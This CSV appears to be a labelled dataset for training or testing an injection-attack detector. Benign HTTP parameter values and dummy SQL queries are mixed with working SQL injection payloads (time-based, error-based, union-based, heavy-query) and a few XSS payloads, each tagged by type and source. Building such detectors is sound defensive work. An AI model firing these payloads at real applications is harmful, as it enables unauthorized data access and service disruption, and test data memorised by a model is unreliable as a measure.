payload,attack_type,is_attack,source
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",sqli,1,SQLiV3
caudle,norm,0,HttpParamsDataset
"calle benifairo, 189, 9?g",norm,0,HttpParamsDataset
mareah,norm,0,HttpParamsDataset
SELECT hidden ( s FROM kill RIGHT JOIN,norm,0,SQLiV3
SELECT MIN ( sea )  AS hurt FROM silence,norm,0,SQLiV3
"  SELECT thrownID AS ID, beyond AS surprise FROM ought",norm,0,SQLiV3
SELECT TOP 3 * FROM wall WHERE organized = 'willing',norm,0,SQLiV3
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",sqli,1,SQLiV3
"1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671",sqli,1,HttpParamsDataset
"1%"")) and 8316=6410#",sqli,1,HttpParamsDataset
ornellas3@professionalhost.com.pro,norm,0,HttpParamsDataset
riogordo,norm,0,HttpParamsDataset
thimeos siurana,norm,0,HttpParamsDataset
"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",sqli,1,SQLiV3
propaganda,norm,0,HttpParamsDataset
"calle s'arraval, 114",norm,0,HttpParamsDataset
-6766'))) or 3038=3038,sqli,1,HttpParamsDataset
"1 where 9869  =  9869 union all select null,null#",sqli,1,SQLiV3
65340567m,norm,0,HttpParamsDataset
stockbridge@softstylestudio.mk,norm,0,HttpParamsDataset
1%')) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,HttpParamsDataset
"1'))) and make_set(8403=8403,8899) and ((('zxon' like 'zxon",sqli,1,HttpParamsDataset
"1"") where 4964=4964;(select * from (select(sleep(5)))srmq)--",sqli,1,HttpParamsDataset
desmerecer,norm,0,HttpParamsDataset
011a88d4d,norm,0,HttpParamsDataset
dormer,norm,0,HttpParamsDataset
"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",sqli,1,SQLiV3
SELECT * FROM salt WHERE NOT stage = 'examine'  AND NOT day = 'alphabet',norm,0,SQLiV3
hofmeist0,norm,0,HttpParamsDataset
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""icow"" like ""icow",sqli,1,SQLiV3
1152,norm,0,HttpParamsDataset
brier,norm,0,HttpParamsDataset
busoms redolad,norm,0,HttpParamsDataset
8198356178876064,norm,0,HttpParamsDataset
FROM  ( SELECT DISTINCT therefore FROM recall ) ,norm,0,SQLiV3
muskiz,norm,0,HttpParamsDataset
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf",sqli,1,HttpParamsDataset
fechner_rabel@fortelingenieria.sd,norm,0,HttpParamsDataset
1523492896649032,norm,0,HttpParamsDataset
SELECT * FROM three WHERE captured = 'actually' LIMIT 3,norm,0,SQLiV3
SELECT TOP 50 PERCENT * FROM today SELECT * FROM taught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM improve,norm,0,SQLiV3
SELECT * FROM himself WHERE dried BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
SELECT COUNT ( pick ) FROM guard,norm,0,SQLiV3
"1"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,HttpParamsDataset
-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,sqli,1,SQLiV3
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('cogk'='cogk",sqli,1,HttpParamsDataset
"calle rocafort, 169 4c",norm,0,HttpParamsDataset
mary-ann,norm,0,HttpParamsDataset
"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",sqli,1,SQLiV3
"1%') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='",sqli,1,HttpParamsDataset
nagel ordoes,norm,0,HttpParamsDataset
calcinable,norm,0,HttpParamsDataset
6676519616771498,norm,0,HttpParamsDataset
"1'||(select 'cjwx' from dual where 7637=7637 and elt(9548=3991,3991))||'",sqli,1,HttpParamsDataset
"c/ valdes salas, 39 11?c",norm,0,HttpParamsDataset
2450000000000000,norm,0,SQLiV3
5420336038280470,norm,0,HttpParamsDataset
alcalde gregorio espino 165,norm,0,HttpParamsDataset
SELECT * FROM machinery 3 SELECT * FROM southern,norm,0,SQLiV3
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",sqli,1,SQLiV3
SELECT AVG ( smell ) FROM alive SELECT SUM ( subject ) ,norm,0,SQLiV3
"1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",sqli,1,SQLiV3
3742880000000000,norm,0,SQLiV3
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",sqli,1,SQLiV3
-8047' or 3038  =  3038,sqli,1,SQLiV3
-4191  )   order by 1#,sqli,1,SQLiV3
FROM  ( SELECT DISTINCT friendly FROM invented ) ,norm,0,SQLiV3
6140460000000000,norm,0,SQLiV3
fierro@porqueagel.je,norm,0,HttpParamsDataset
0604900519989178,norm,0,HttpParamsDataset
"1"") where 2657=2657 and 5309=7592--",sqli,1,HttpParamsDataset
36930027p,norm,0,HttpParamsDataset
bnrlsi,norm,0,HttpParamsDataset
guarda_sol,norm,0,HttpParamsDataset
11690,norm,0,HttpParamsDataset
xe2foba,norm,0,HttpParamsDataset
SELECT * FROM bottom,norm,0,SQLiV3
"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli,1,SQLiV3
"-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,HttpParamsDataset
SELECT lunch ( s FROM dead RIGHT JOIN,norm,0,SQLiV3
1')) as qovd where 8865=8865 and (3020=3020)*6703--,sqli,1,HttpParamsDataset
1') where 6440=6440 or (select * from (select(sleep(5)))sddo)#,sqli,1,HttpParamsDataset
"1,  (  case when 5514  =  9602 then 1 else null end  )  ",sqli,1,SQLiV3
SELECT MIN ( surprise )  AS support FROM work,norm,0,SQLiV3
SELECT COUNT ( these ) FROM lovely,norm,0,SQLiV3
"1"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,HttpParamsDataset
-5021'+(select yadq where 4285=4285 order by 1#,sqli,1,HttpParamsDataset
"1'+(select 'ixvd' where 4772=4772 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,HttpParamsDataset
SELECT * FROM scared FETCH FIRST 50 PERCENT ROWS ONLY,norm,0,SQLiV3
"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli,1,SQLiV3
1 where 8506  =  8506,sqli,1,SQLiV3
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",sqli,1,HttpParamsDataset
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",sqli,1,SQLiV3
5389852449679105,norm,0,HttpParamsDataset
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",sqli,1,SQLiV3
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,HttpParamsDataset
"1%';select benchmark(5000000,md5(0x714e4153))#",sqli,1,HttpParamsDataset
SELECT TOP 3 * FROM higher,norm,0,SQLiV3
chakiris@forohh.sa,norm,0,HttpParamsDataset
amalio,norm,0,HttpParamsDataset
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('gydh'='gydh",sqli,1,HttpParamsDataset
"1')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,HttpParamsDataset
calle nieto 41,norm,0,HttpParamsDataset
SELECT MIN ( information )  AS fear FROM society,norm,0,SQLiV3
24448,norm,0,HttpParamsDataset
patey@suncorp.st,norm,0,HttpParamsDataset
"-5275%')) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",sqli,1,HttpParamsDataset
-7941 or (5822=8754)*8754-- eepn,sqli,1,HttpParamsDataset
"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",sqli,1,SQLiV3
maliski,norm,0,HttpParamsDataset
tarsky,norm,0,HttpParamsDataset
8762163912955925,norm,0,HttpParamsDataset
" SELECT Orders.OrderID, Orders.OrderDate, Customers.CustomerName FROM Customers, Orders WHERE Customers.CustomerName = 'Around the Horn' AND Customers.CustomerID = Orders.CustomerID;",norm,0,SQLiV3
SELECT MIN ( prepare )  AS accurate FROM negative,norm,0,SQLiV3
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""nwjv""=""nwjv",sqli,1,HttpParamsDataset
"-2384%')) union all select 2467,2467,2467,2467#",sqli,1,HttpParamsDataset
"1,(select (case when (2970=5830) then 1 else 2970*(select 2970 from mysql.db) end))",sqli,1,HttpParamsDataset
calle fausto fraile 0,norm,0,HttpParamsDataset
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,norm,0,SQLiV3
"1',(select (case when (5586=6403) then 1 else 5586*(select 5586 from mysql.db) end))",sqli,1,HttpParamsDataset
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",sqli,1,SQLiV3
1') and 5999=5879,sqli,1,HttpParamsDataset
1'||  (  select 'qstz' where 6835  =  6835,sqli,1,SQLiV3
SELECT * FROM planet WHERE nest = 'steam' LIMIT 3,norm,0,SQLiV3
gras egovil,norm,0,HttpParamsDataset
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,HttpParamsDataset
-3107') where 7782=7782 or 8571=8571--,sqli,1,HttpParamsDataset
"1%""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,sqli,1,SQLiV3
"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",sqli,1,SQLiV3
"1%"")) waitfor delay '0:0:5' and ((""%""=""",sqli,1,HttpParamsDataset
antulio,norm,0,HttpParamsDataset
"INSERT INTO creature ( finest, tin, till, fort, pilot, term )  VALUES  ( 'cup', 'were'. tone', 'yard', 'creature', 'sick', 'till' )  ",norm,0,SQLiV3
"-7248') where 4626=4626 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,HttpParamsDataset
"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",sqli,1,SQLiV3
SELECT * FROM take 3,norm,0,SQLiV3
-8809'||(select 'hyzr' where 5694=5694 union all select 5694--,sqli,1,HttpParamsDataset
SELECT * FROM tree WHERE most BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
copley@pisossantcugat.bf,norm,0,HttpParamsDataset
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""oyfz""=""oyfz",sqli,1,HttpParamsDataset
-2300) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,HttpParamsDataset
cu25439y,norm,0,HttpParamsDataset
verrilli,norm,0,HttpParamsDataset
e1pirativo,norm,0,HttpParamsDataset
trashumacin,norm,0,HttpParamsDataset
"  UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass",norm,0,SQLiV3
gates,norm,0,HttpParamsDataset
1%' and 1736  =  4220,sqli,1,SQLiV3
bediaga,norm,0,HttpParamsDataset
sollman,norm,0,HttpParamsDataset
11639,norm,0,HttpParamsDataset
">""<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",xss,1,HttpParamsDataset
"-4639""   )    )     )   or 8550  =  9348",sqli,1,SQLiV3
castellol,norm,0,HttpParamsDataset
"1 where 2060=2060;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,HttpParamsDataset
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",sqli,1,SQLiV3
1'))) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,HttpParamsDataset
hlinka,norm,0,HttpParamsDataset
1%'   )    )     ) ,sqli,1,SQLiV3
"""x` `<script>alert(1)</script>""` `>",xss,1,HttpParamsDataset
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq",sqli,1,HttpParamsDataset
1646326838248937,norm,0,HttpParamsDataset
SELECT broken ( s )  FROM had UNION ALL,norm,0,SQLiV3
select sleep  (  5  )  #,sqli,1,SQLiV3
1'||(select 'ptkj' from dual where 6263=6263 union all select null--,sqli,1,HttpParamsDataset
" SELECT * FROM choose ORDER BY finger, entirely",norm,0,SQLiV3
"1) as hhly where 2906=2906;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,HttpParamsDataset
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",sqli,1,HttpParamsDataset
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('ykjs' like 'ykjs,sqli,1,HttpParamsDataset
abdollah,norm,0,HttpParamsDataset
47680,norm,0,HttpParamsDataset
28812,norm,0,HttpParamsDataset
"1"" where 8571=8571;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,HttpParamsDataset
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',norm,0,SQLiV3
SELECT * FROM additional WHERE writing NOT BETWEEN 'any' AND 'peace',norm,0,SQLiV3
9177356763269227,norm,0,HttpParamsDataset
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
31414,norm,0,HttpParamsDataset
SELECT * FROM exclaimed WHERE laid = 'darkness',norm,0,SQLiV3
bruasewetter.astin6@locuraporno.int,norm,0,HttpParamsDataset
grant@ubuybetter.yu,norm,0,HttpParamsDataset
"1' where 5778=5778;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,HttpParamsDataset
"1%"" rlike sleep(5)#",sqli,1,HttpParamsDataset
"c/ alqueria de rubiols, s/n, 11?d",norm,0,HttpParamsDataset
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",sqli,1,SQLiV3
16417,norm,0,HttpParamsDataset
50245802w,norm,0,HttpParamsDataset
"<bgsound src=""javascript:alert('crosssitescripting');"">",xss,1,HttpParamsDataset
-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,sqli,1,SQLiV3
leroy-beaulieu.rizzo7@softwaresaas.cl,norm,0,HttpParamsDataset
"<bgsound id=xss src=""javascript:alert('xss');"">",xss,1,HttpParamsDataset
-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,sqli,1,SQLiV3
1'||  (  select 'awic' where 5227  =  5227,sqli,1,SQLiV3
"   SELECT opportunity, ear, potFROM fat WHERE four  IS NOT NULL",norm,0,SQLiV3
78581094f,norm,0,HttpParamsDataset
SELECT fairly ( s FROM volume RIGHT JOIN,norm,0,SQLiV3
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""cuzi"" like ""cuzi",sqli,1,HttpParamsDataset
SELECT top FROM noun UNION ALL SELECT naturally FROM rhythm ORDER BY dozen,norm,0,SQLiV3
bablica,norm,0,HttpParamsDataset
"calle goya 46, 10?g",norm,0,HttpParamsDataset
SELECT TOP 3 * FROM between,norm,0,SQLiV3
crous zuta,norm,0,HttpParamsDataset
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",sqli,1,SQLiV3
SELECT * FROM catch WHERE instrument BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,HttpParamsDataset
drennan,norm,0,HttpParamsDataset
morgenstern9@laschinas.ba,norm,0,HttpParamsDataset
1' in boolean mode);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,HttpParamsDataset
1'||(select 'bifa' where 6077=6077 and 4547=9301,sqli,1,HttpParamsDataset
"1') where 3375=3375 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,HttpParamsDataset
"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",sqli,1,SQLiV3
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
"1) where 9213=9213 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,HttpParamsDataset
413f1go,norm,0,HttpParamsDataset
gerianne,norm,0,HttpParamsDataset
"1%"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,HttpParamsDataset
""";alert('xss');//",xss,1,HttpParamsDataset
"1%')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",sqli,1,HttpParamsDataset
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",sqli,1,SQLiV3
"1 or 8421=(select count(*) from generate_series(1,5000000))",sqli,1,HttpParamsDataset
"  SELECT transportation,child FROM furniture WHERE other = 'poetry' UNION SELECT dry, act FROM plate",norm,0,SQLiV3
"  SELECT massage,built,enemy FROM order LEFT JOIN Orders ON immediately.religiousID =  paragraph.although ORDER BY bee.desert",norm,0,SQLiV3
"//--></script>"">'><script>alert(string.fromcharcode(88,83,83))</script>",xss,1,HttpParamsDataset
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",sqli,1,HttpParamsDataset
1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sqli,1,SQLiV3
1 and 6969=(select 6969 from pg_sleep(5))# pkcp,sqli,1,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM cold SELECT * FROM particular FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM express,norm,0,SQLiV3
1')) and 4242=5831 and (('xflh' like 'xflh,sqli,1,HttpParamsDataset
"1' in boolean mode) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)#",sqli,1,HttpParamsDataset
bardo,norm,0,HttpParamsDataset
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('fuyl'='fuyl",sqli,1,HttpParamsDataset
